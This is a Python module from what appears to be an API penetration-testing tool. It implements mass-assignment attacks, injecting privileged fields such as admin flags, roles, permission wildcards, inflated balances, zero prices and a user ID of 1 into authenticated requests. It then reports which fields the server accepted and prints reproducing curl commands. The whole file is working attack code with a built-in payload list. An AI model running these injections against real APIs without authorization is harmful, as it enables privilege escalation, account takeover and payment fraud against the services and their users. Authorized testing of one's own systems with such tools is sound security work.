# janus/core/mass_assignment.py
"""
Mass Assignment Attack Module.
Tests for privilege escalation via parameter pollution.
"""

from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
import json
import requests
from copy import deepcopy


@dataclass
class MassAssignmentResult:
    """Result of a mass assignment test."""
    endpoint: str
    method: str
    vulnerable: bool
    accepted_fields: List[str]
    reflected_fields: List[str]
    original_body: Dict
    injected_body: Dict
    response_status: int
    response_body: Any
    confidence: float
    attack_type: str
    curl_command: str


class MassAssignmentTester:
    """
    Tests for Mass Assignment / Parameter Pollution vulnerabilities.
    
    The Attack: Inject privileged fields into requests and check if they're accepted.
    """
    
    # Common privilege escalation fields to inject
    PRIVILEGE_FIELDS: Dict[str, List[Any]] = {
        # Admin flags
        'is_admin': [True, 1, "true", "1"],
        'isAdmin': [True, 1],
        'admin': [True, 1],
        'is_superuser': [True, 1],
        'isSuperuser': [True, 1],
        'superuser': [True, 1],
        
        # Role manipulation
        'role': ['admin', 'administrator', 'superuser', 'root'],
        'roles': [['admin'], ['administrator', 'user']],
        'user_role': ['admin'],
        'userRole': ['admin'],
        'role_id': [1, 0],  # Assuming 1 or 0 is admin
        'roleId': [1, 0],
        
        # Permission flags
        'permissions': [['*'], ['admin', 'read', 'write', 'delete']],
        'privilege': ['admin', 'elevated'],
        'level': [999, 0, 'admin'],
        'tier': ['premium', 'enterprise', 'admin'],
        'plan': ['enterprise', 'unlimited', 'admin'],
        
        # Account status
        'verified': [True, 1],
        'is_verified': [True],
        'email_verified': [True],
        'active': [True],
        'is_active': [True],
        'approved': [True],
        'is_approved': [True],
        
        # Financial
        'balance': [999999, 1000000],
        'credit': [999999],
        'credits': [999999],
        'discount': [100, 1.0],  # 100% discount
        'price': [0, 0.01],
        
        # Account takeover
        'user_id': [1],  # Try to become user 1 (often admin)
        'userId': [1],
        'owner_id': [1],
        'ownerId': [1],
    }
    
    # Fields to check in response for reflection
    REFLECTION_INDICATORS = [
        'is_admin', 'isAdmin', 'admin', 'role', 'roles', 
        'permissions', 'privilege', 'superuser', 'verified',
        'balance', 'credit', 'plan', 'tier', 'level'
    ]
    
    def __init__(self, custom_fields: Dict[str, List[Any]] = None):
        self.privilege_fields = self.PRIVILEGE_FIELDS.copy()
        if custom_fields:
            self.privilege_fields.update(custom_fields)
    
    def _generate_curl(self, endpoint: str, method: str, headers: Dict, body: Dict) -> str:
        """Generate a curl command for reproduction."""
        header_str = " ".join([f'-H "{k}: {v}"' for k, v in headers.items()])
        body_str = json.dumps(body)
        return f'curl -X {method} {header_str} -d \'{body_str}\' "{endpoint}"'
    
    def _check_reflection(self, response_body: Any, injected_keys: List[str]) -> List[str]:
        """Check if injected fields are reflected in response."""
        reflected = []
        if isinstance(response_body, dict):
            response_str = json.dumps(response_body).lower()
            for key in injected_keys:
                if key.lower() in response_str:
                    reflected.append(key)
        return reflected
    
    def _check_accepted(self, original: Dict, response: Any, injected_keys: List[str]) -> List[str]:
        """Check if injected fields were accepted (appear in response but not in original)."""
        accepted = []
        if isinstance(response, dict):
            for key in injected_keys:
                # Check various case formats
                key_variants = [key, key.lower(), key.replace('_', '')]
                for variant in key_variants:
                    if variant in response and variant not in original:
                        accepted.append(key)
                        break
                    # Also check nested
                    for nested_key in response.keys():
                        if isinstance(response[nested_key], dict):
                            if variant in response[nested_key]:
                                accepted.append(key)
                                break
        return list(set(accepted))
    
    def test_mass_assignment(
        self,
        endpoint: str,
        original_body: Dict,
        token: str,
        method: str = "POST",
        headers: Dict = None,
        timeout: int = 10
    ) -> MassAssignmentResult:
        """
        Test an endpoint for mass assignment vulnerability.
        
        Args:
            endpoint: The API endpoint URL
            original_body: The original valid request body
            token: Authentication token
            method: HTTP method (POST, PUT, PATCH)
            headers: Additional headers
            timeout: Request timeout
        
        Returns:
            MassAssignmentResult with findings
        """
        # Build headers
        request_headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }
        if headers:
            request_headers.update(headers)
        
        # Build injected body with one value from each privilege field
        injected_body = deepcopy(original_body)
        injected_keys = []
        
        for field, values in self.privilege_fields.items():
            if field not in original_body:  # Don't overwrite existing fields
                injected_body[field] = values[0]  # Use first value
                injected_keys.append(field)
        
        # Make the request
        try:
            response = requests.request(
                method,
                endpoint,
                headers=request_headers,
                json=injected_body,
                timeout=timeout
            )
            
            try:
                response_body = response.json()
            except json.JSONDecodeError:
                response_body = {"_raw": response.text[:500]}
            
        except requests.RequestException as e:
            return MassAssignmentResult(
                endpoint=endpoint,
                method=method,
                vulnerable=False,
                accepted_fields=[],
                reflected_fields=[],
                original_body=original_body,
                injected_body=injected_body,
                response_status=0,
                response_body={"error": str(e)},
                confidence=0.0,
                attack_type="mass_assignment",
                curl_command=self._generate_curl(endpoint, method, request_headers, injected_body)
            )
        
        # Analyze response
        reflected = self._check_reflection(response_body, injected_keys)
        accepted = self._check_accepted(original_body, response_body, injected_keys)
        
        # Determine vulnerability
        vulnerable = False
        confidence = 0.0
        
        if response.status_code in [200, 201, 204]:
            if accepted:
                vulnerable = True
                confidence = 0.90
            elif reflected:
                vulnerable = True
                confidence = 0.75
            elif response.status_code == 200:
                # Might be silently accepted - medium confidence
                confidence = 0.40
        
        return MassAssignmentResult(
            endpoint=endpoint,
            method=method,
            vulnerable=vulnerable,
            accepted_fields=accepted,
            reflected_fields=reflected,
            original_body=original_body,
            injected_body=injected_body,
            response_status=response.status_code,
            response_body=response_body,
            confidence=confidence,
            attack_type="mass_assignment",
            curl_command=self._generate_curl(endpoint, method, request_headers, injected_body)
        )
    
    def test_field_by_field(
        self,
        endpoint: str,
        original_body: Dict,
        token: str,
        method: str = "POST",
        timeout: int = 10
    ) -> List[MassAssignmentResult]:
        """
        Test each privilege field individually for more precise detection.
        """
        results = []
        headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }
        
        for field, values in self.privilege_fields.items():
            if field in original_body:
                continue
            
            for value in values[:2]:  # Test first 2 values
                test_body = deepcopy(original_body)
                test_body[field] = value
                
                try:
                    response = requests.request(
                        method,
                        endpoint,
                        headers=headers,
                        json=test_body,
                        timeout=timeout
                    )
                    
                    try:
                        response_body = response.json()
                    except:
                        response_body = {}
                    
                    # Check if accepted
                    if response.status_code in [200, 201]:
                        if field in str(response_body):
                            results.append(MassAssignmentResult(
                                endpoint=endpoint,
                                method=method,
                                vulnerable=True,
                                accepted_fields=[field],
                                reflected_fields=[field] if field in str(response_body) else [],
                                original_body=original_body,
                                injected_body=test_body,
                                response_status=response.status_code,
                                response_body=response_body,
                                confidence=0.85,
                                attack_type="mass_assignment",
                                curl_command=self._generate_curl(endpoint, method, headers, test_body)
                            ))
                            break  # Found vulnerability with this field
                            
                except requests.RequestException:
                    continue
        
        return results
